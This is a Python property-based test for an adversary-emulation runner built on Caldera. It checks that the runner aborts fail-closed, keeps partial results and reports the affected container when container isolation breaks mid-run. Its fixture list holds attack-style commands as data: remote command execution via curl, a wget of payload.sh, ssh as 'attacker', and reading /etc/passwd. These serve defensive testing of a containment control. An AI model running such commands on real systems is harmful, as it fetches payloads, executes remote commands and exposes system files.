"""Property-based test for the fail-closed isolation break during execution
(task 4.4) — security core of the in-loop containment re-check.

# Feature: stage6-execution-redesign, Property 14: Interrupção fail-closed na
# quebra de isolamento durante a execução

**Validates: Requirements 6.3, 6.4**

This is a ``feature`` property test (stage6-execution-redesign is a feature
spec): the property is expected to HOLD on the current
:class:`~app.services.operation.runner.OperationRunner` implementation, whose
periodic in-loop isolation re-check was implemented in task 4.1.

The invariant, stated operationally over the runner's public ``run`` API
--------------------------------------------------------------------------
For any execution where the periodic isolation re-check inside the collection
loop (:meth:`OperationRunner._collect_until_terminal`) passes in ``k`` polls and
fails at poll ``k + 1``:

* **no additional command is fired after the failure** — the re-check runs at
  the *start* of each loop iteration, *before* the Caldera ``get_operation``
  read of that iteration, so when it breaks on iteration ``k + 1`` that poll's
  links are never observed/reconciled: exactly ``k`` polls were reconciled and
  the chain of poll ``k + 1`` leaves no trace;
* the already-collected :class:`AbilityResult` rows are **preserved** — the
  persisted count equals the number of links observed up to and including poll
  ``k`` (the growing chain), none discarded;
* the Operation ends signaling the **containment break**:
  :data:`RunOutcome.ISOLATION_BROKEN` with final state
  :data:`OperationState.ABORTED`, and the affected container is surfaced in the
  returned :class:`IsolationResult`.

Everything external is injected (no real Caldera, no real Docker daemon, no real
clock/sleep):

- **Caldera** is a :class:`httpx.MockTransport`-backed real :class:`CalderaClient`
  whose ``GET /api/v2/operations/{id}`` serves a **growing**, always non-terminal
  (``running``) chain — one extra link per poll — and **counts** every GET so we
  can prove exactly ``k`` polls were reconciled and none happened after the break.
- **Isolation** is a stateful fake verifier that passes for the pre-flight gate
  plus the first ``k`` in-loop re-checks and then returns a non-passing
  :class:`IsolationResult` identifying a specific affected container.
- The **clock** is an injected stepping counter whose large step (relative to a
  small ``isolation_recheck_interval``) makes a re-check fire on *every* loop
  iteration, while a huge ``collection_timeout`` keeps the deadline unreachable
  so termination is driven purely by the isolation break — the variable under
  test. The **sleeper** is a no-op.
- The database is an **ephemeral temp-file SQLite** built fresh *per example*
  and torn down in a ``finally`` block, so row counts are exact and no ``.db``
  state leaks between examples.

An **independent oracle** recomputes, from the generated inputs, the number of
reconciled polls (``k``) and the number of preserved partials (the chain length
at poll ``k``), so the assertions never trust the implementation to decide the
expected result.

_Requirements: 6.3, 6.4_
"""

from __future__ import annotations

import json
import os
import tempfile
from dataclasses import dataclass, field
from pathlib import Path

import httpx
from hypothesis import HealthCheck, given, settings
from hypothesis import strategies as st
from sqlalchemy import func, select
from sqlalchemy.orm import Session, sessionmaker

from app.core.config import Settings
from app.db.base import Base, import_models
from app.db.session import create_db_engine
from app.models.domain import AbilityResult, Operation
from app.models.enums import AbilityResultStatus, OperationState
from app.services.audit.audit_logger import AuditLogger
from app.services.caldera import (
    ABILITIES_PATH,
    HEALTH_PATH,
    OPERATIONS_PATH,
    CalderaClient,
)
from app.services.containment.isolation import ContainerIsolationVerdict, IsolationResult
from app.services.operation.runner import OperationRunner, RunOutcome

_CALDERA_OP_ID = "op-isolation-break"

# The affected container the broken re-check identifies (Req. 6.4). Must be one
# of the target containers the runner re-checks so the surfaced verdict matches.
_AFFECTED_CONTAINER = "nginx"
_TARGET_CONTAINERS: tuple[str, ...] = ("nginx", "db")


# ---------------------------------------------------------------------------
# Duck-typed Ability the runner / containment / preview all accept.
# ---------------------------------------------------------------------------


@dataclass(frozen=True)
class FakeAbility:
    """A minimal Ability exposing the attributes the runner consumes.

    Kept a plain object (no DB row) so the run path never depends on
    Case/Ability rows existing. The executor commands are internal-only so the
    destination-containment gate always passes, isolating Property 14's variable
    (the mid-run isolation break) from the pre-flight destination gate.
    """

    ability_id: str
    name: str
    executors: tuple[dict[str, str], ...]


# Internal-only concrete commands (all destinations ⊆ internal subnets) so the
# containment gate always PASSES.
_INTERNAL_COMMAND_TEMPLATES: tuple[str, ...] = (
    "curl -X POST -F 'cmd=whoami' http://192.168.20.30:5055/exec",
    "wget http://192.168.20.30/payload.sh",
    "ssh attacker@192.168.30.40 'id'",
    "cat /etc/passwd",
    "uname -a",
)


def _ability_strategy() -> st.SearchStrategy[FakeAbility]:
    """Generate an Ability with 1..2 internal-only executor commands."""
    return st.builds(
        lambda uid, cmds: FakeAbility(
            ability_id=f"ability-{uid.hex[:8]}",
            name=f"T{1000 + (uid.int % 600)} - generated",
            executors=tuple(
                {"name": "sh", "platform": "linux", "command": cmd} for cmd in cmds
            ),
        ),
        st.uuids(),
        st.lists(st.sampled_from(_INTERNAL_COMMAND_TEMPLATES), min_size=1, max_size=2),
    )


# Non-terminal Caldera link status codes only: ``None`` -> pendente, ``-3`` ->
# em_execucao. The chain never reaches a terminal link, so the loop can only
# exit via the isolation break (its deadline is kept unreachable).
_NON_TERMINAL_STATUS_CODES: tuple[int | None, ...] = (None, -3)


# ---------------------------------------------------------------------------
# Mocked Caldera — serves a GROWING, always non-terminal chain and counts polls.
# ---------------------------------------------------------------------------


@dataclass
class GrowingChainCaldera:
    """A MockTransport handler serving a growing non-terminal chain per poll.

    ``GET /api/v2/operations/{id}`` returns ``state="running"`` (never terminal)
    with a chain that grows by one link on each successive GET: the n-th GET
    serves ``n`` links (``link-0 .. link-(n-1)``). Every GET is recorded in
    ``get_polls`` (one entry per poll, carrying the chain length served) so the
    test can prove exactly ``k`` polls were reconciled and **none** happened
    after the isolation break fired on iteration ``k + 1``.

    The growing chain matches the design's "growing chain" fixture for Property
    14 and makes the preserved-partials count depend on ``k`` (links accumulate),
    so the preservation invariant is exercised with a non-trivial, changing set.
    """

    status_pool: tuple[int | None, ...]
    requests: list[httpx.Request] = field(default_factory=list)
    get_polls: list[int] = field(default_factory=list)

    def _chain_for(self, link_count: int) -> list[dict]:
        chain: list[dict] = []
        for index in range(link_count):
            status = self.status_pool[index % len(self.status_pool)]
            link: dict = {
                "id": f"link-{index}",
                "ability": {"ability_id": f"ability-{index}"},
                "command": f"cmd-{index}",
                "paw": "kali",
            }
            # Omit "status" entirely for the pendente (None) sentinel so the
            # payload mirrors a link Caldera has not run yet; otherwise send the
            # concrete sentinel code.
            if status is not None:
                link["status"] = status
            chain.append(link)
        return chain

    def __call__(self, request: httpx.Request) -> httpx.Response:
        self.requests.append(request)
        method = request.method.upper()
        path = request.url.path

        if method == "GET" and path == HEALTH_PATH:
            return httpx.Response(200, json={"status": "ok"})
        if method == "POST" and path == ABILITIES_PATH:
            return httpx.Response(200, json=json.loads(request.content.decode("utf-8")))
        if method == "POST" and path == OPERATIONS_PATH:
            return httpx.Response(
                200,
                json={"id": _CALDERA_OP_ID, "name": "run", "state": "running"},
            )
        if method == "GET" and path == f"{OPERATIONS_PATH}/{_CALDERA_OP_ID}":
            # Growing chain: the n-th poll serves n links (1-indexed).
            link_count = len(self.get_polls) + 1
            self.get_polls.append(link_count)
            return httpx.Response(
                200,
                json={
                    "id": _CALDERA_OP_ID,
                    "state": "running",
                    "chain": self._chain_for(link_count),
                },
            )
        raise AssertionError(f"unexpected request: {method} {path}")


# ---------------------------------------------------------------------------
# Stateful isolation verifier — passes k times (in-loop) then breaks.
# ---------------------------------------------------------------------------


@dataclass
class BreakingIsolationVerifier:
    """A fake isolation verifier that passes a fixed number of times then fails.

    Mirrors :func:`inspect_isolation`'s signature ``(containers, inspector)`` so
    it drops straight into the runner via ``isolation_verifier=``. It passes for
    the first ``pass_calls`` invocations (the pre-flight gate call plus the first
    ``k`` in-loop re-checks) and from then on returns a **non-passing**
    :class:`IsolationResult` whose offending verdict names ``affected`` — the
    affected container the run must surface (Req. 6.4).

    ``calls`` records how many times the verifier ran, so the test can assert the
    break fired exactly on the expected re-check.
    """

    pass_calls: int
    affected: str
    calls: int = 0

    def __call__(self, containers: list[str], _inspector: object) -> IsolationResult:
        self.calls += 1
        if self.calls <= self.pass_calls:
            verdicts = tuple(
                ContainerIsolationVerdict(container=name, isolated=True, reasons=())
                for name in containers
            )
            return IsolationResult(passed=True, verdicts=verdicts)
        # Isolation broke: the affected container is no longer isolated, every
        # other target stays isolated. The overall verdict fails (fail-closed).
        verdicts = tuple(
            ContainerIsolationVerdict(
                container=name,
                isolated=name != self.affected,
                reasons=()
                if name != self.affected
                else ("conectado à rede bridge externa 'local-network'",),
            )
            for name in containers
        )
        return IsolationResult(passed=False, verdicts=verdicts)


# ---------------------------------------------------------------------------
# Injected clock / sleeper — a re-check fires on every loop iteration.
# ---------------------------------------------------------------------------


@dataclass
class SteppingClock:
    """A monotonic clock that advances a fixed step on each call.

    Starts at ``0.0`` and returns ``n * step`` on the n-th call. With a step
    large relative to the (small) ``isolation_recheck_interval`` the loop's
    start-of-iteration re-check condition always holds, so a re-check fires on
    *every* iteration — exactly the cadence Property 14 needs to drive the break.
    """

    step: float
    _calls: int = 0

    def __call__(self) -> float:
        value = self._calls * self.step
        self._calls += 1
        return value


def _noop_sleep(_seconds: float) -> None:
    """A no-op sleeper so the loop never touches the real clock."""
    return None


# ---------------------------------------------------------------------------
# Ephemeral per-example SQLite (exact counts, no state leak).
# ---------------------------------------------------------------------------


def _build_ephemeral_session() -> tuple[Session, Path, object]:
    """Create a fresh temp-file SQLite engine + schema and return a session."""
    tmp_dir = tempfile.mkdtemp(prefix="stage6_isolation_break_")
    db_path = Path(tmp_dir) / "runner.db"
    settings_obj = Settings(database_url=f"sqlite:///{db_path.as_posix()}")

    engine = create_db_engine(settings_obj)
    import_models()
    Base.metadata.create_all(bind=engine)

    session_factory: sessionmaker[Session] = sessionmaker(
        bind=engine,
        autocommit=False,
        autoflush=False,
        expire_on_commit=False,
        future=True,
        class_=Session,
    )
    return session_factory(), db_path, engine


def _count(session: Session, model: type) -> int:
    """Count all rows of ``model`` in the (per-example) database."""
    return session.execute(select(func.count()).select_from(model)).scalar_one()


# ---------------------------------------------------------------------------
# Property 14 — fail-closed interruption on isolation break during execution.
# ---------------------------------------------------------------------------


@settings(
    max_examples=150,
    deadline=None,
    suppress_health_check=[HealthCheck.too_slow],
)
@given(
    abilities=st.lists(_ability_strategy(), min_size=1, max_size=4),
    # ``k`` = number of in-loop re-checks that PASS before the break. The break
    # fires on re-check k + 1 (poll k + 1 is never reconciled).
    k=st.integers(min_value=0, max_value=6),
    status_pool=st.lists(
        st.sampled_from(_NON_TERMINAL_STATUS_CODES), min_size=1, max_size=2
    ),
    campaign_id=st.sampled_from(["apt41_dust", "c0010", "shadowray", None]),
)
def test_property14_isolation_break_fail_closed_during_execution(
    abilities: list[FakeAbility],
    k: int,
    status_pool: list[int | None],
    campaign_id: str | None,
) -> None:
    """Property 14: a quebra de isolamento interrompe fail-closed, preservando parciais.

    # Feature: stage6-execution-redesign, Property 14: Interrupção fail-closed na
    # quebra de isolamento durante a execução
    Validates: Requirements 6.3, 6.4

    For any execution where the periodic re-check passes in ``k`` polls and fails
    at poll ``k + 1``:

    * no additional command is fired after the failure — exactly ``k`` Caldera
      polls were reconciled and poll ``k + 1`` left no trace;
    * the already-collected ``AbilityResult`` rows are preserved — the persisted
      count equals the chain length observed at poll ``k`` (``k`` links, since the
      chain grows by one link per poll);
    * the Operation ends with :data:`RunOutcome.ISOLATION_BROKEN` and final state
      :data:`OperationState.ABORTED`, surfacing the affected container.
    """
    session, db_path, engine = _build_ephemeral_session()
    handler = GrowingChainCaldera(status_pool=tuple(status_pool))
    caldera = CalderaClient(transport=httpx.MockTransport(handler))

    # Independent oracle for how many in-loop re-checks pass before the break:
    # the verifier passes once for the pre-flight gate (gate 3) plus ``k`` in-loop
    # re-checks, then fails. So ``pass_calls == 1 + k``.
    verifier = BreakingIsolationVerifier(pass_calls=1 + k, affected=_AFFECTED_CONTAINER)

    try:
        runner = OperationRunner(
            session=session,
            caldera=caldera,
            audit_logger=AuditLogger(session),
            isolation_verifier=verifier,
            collection_interval=2.0,
            # Huge timeout so the deadline is never the reason the loop stops —
            # termination is driven purely by the isolation break under test.
            collection_timeout=1_000_000.0,
            # Small re-check interval; with the large clock step below a re-check
            # fires on EVERY loop iteration, so the break lands precisely on the
            # (k + 1)-th in-loop re-check.
            isolation_recheck_interval=1.0,
            clock=SteppingClock(step=100.0),
            sleeper=_noop_sleep,
        )

        result = runner.run(
            campaign_id=campaign_id,
            abilities=abilities,
            adversary_id="adv-isolation-break",
            confirmed=True,
            target_containers=list(_TARGET_CONTAINERS),
        )

        # --- Outcome + final state signal the containment break (Req. 6.4). ---
        assert result.outcome is RunOutcome.ISOLATION_BROKEN
        assert result.state is OperationState.ABORTED

        # The persisted Operation row carries the same ABORTED terminal state.
        assert _count(session, Operation) == 1
        operation = session.execute(select(Operation)).scalar_one()
        assert operation.state is OperationState.ABORTED

        # --- No command fired after the break: exactly k polls reconciled. ---
        # The re-check runs at the start of each iteration, before that
        # iteration's GET; the break on iteration k + 1 therefore skips its GET.
        assert handler.get_polls == list(range(1, k + 1))
        # The verifier ran exactly 1 (pre-flight) + k (passing) + 1 (breaking).
        assert verifier.calls == 1 + k + 1

        # --- Partials preserved: the chain at poll k had k links, all kept. ---
        # (When k == 0 the break fires before any poll, so nothing is persisted.)
        expected_partials = k
        assert _count(session, AbilityResult) == expected_partials
        assert len(result.ability_results) == expected_partials
        # Every preserved partial is non-terminal (pendente / em_execucao): the
        # break must not fabricate terminal results.
        persisted_statuses = {
            row.status
            for row in session.execute(select(AbilityResult)).scalars().all()
        }
        assert persisted_statuses <= {
            AbilityResultStatus.PENDING,
            AbilityResultStatus.RUNNING,
        }
        # No partial counts as success/failure (none reached a terminal link).
        assert result.total_success == 0
        assert result.total_failure == 0

        # --- The affected container is surfaced (Req. 6.4). ---
        assert result.isolation is not None
        assert result.isolation.passed is False
        offending = {v.container for v in result.isolation.offending}
        assert _AFFECTED_CONTAINER in offending
        # The human-readable message identifies the broken containment.
        assert _AFFECTED_CONTAINER in result.message or "isolamento" in result.message.lower()
    finally:
        caldera.close()
        session.close()
        engine.dispose()
        if db_path.exists():
            os.remove(db_path)
        os.rmdir(db_path.parent)
